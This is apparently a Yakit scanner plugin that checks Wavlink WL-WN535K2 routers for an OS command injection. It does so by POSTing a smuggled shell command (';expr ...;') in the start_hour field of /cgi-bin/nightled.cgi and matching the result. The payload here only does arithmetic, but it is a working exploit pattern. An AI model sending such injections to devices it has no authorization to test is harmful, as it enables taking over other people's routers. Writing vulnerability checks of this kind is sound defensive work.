yakit.AutoInitYakit()

handleCheck = func(target,port){
    var url
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    level=["","low","middle","high","critical"]
    if isTls {
        url="https://"+addr
    }else{
        url="http://"+addr
    }
    vulnable=false

    reference="wavlink wl-wn535k2_firmware os命令中使用的特殊元素转义处理不恰当（os命令注入）"
    severity=level[3]
    type="命令执行"
    r2 = randn(5000000,10000000)
    r1 = randn(500000,1000000)

    poc_url_r0= url + `/cgi-bin/nightled.cgi`
    req_r0, _ := http.NewRequest("POST",poc_url_r0,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),
    http.header(`Content-Type`,`application/x-www-form-urlencoded`),
    http.body(`page=night_led&start_hour=;expr `+ parseStr(r1) +` - `+ parseStr(r2) +`;`),)
    breq,_=http.dump(req_r0)
    resp_r0, err := http.Do(req_r0)
    die(err)
    bresp,_=http.dump(resp_r0)
    header, body = poc.Split(bresp)
    r0_flag = false
    if resp_r0.StatusCode == 200 && str.Contains(string(body),parseStr(parseStr(r1 - r2))) && str.Contains(string(body),"200 OK"){
        r0_flag = true
    }

    poc_url=poc_url_r0
    if r0_flag{
        vulnable = true
    }
    if vulnable {
            yakit.Info("FOUND INFO for %v %v",reference,type)
            risk.NewRisk(
                url, risk.severity(severity), 
                risk.title(sprintf("FOUND %v %v",reference,type)),
                risk.titleVerbose(sprintf("%v %v",reference,type)),
                risk.type(type), risk.typeVerbose(type),
                risk.details({
                    "request": breq,
                    "response": bresp,
                    "url": poc_url,
                }),
            )
        }
    return
}
handle = func(result) {
    if !result.IsOpen(){
        return
    }
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
}
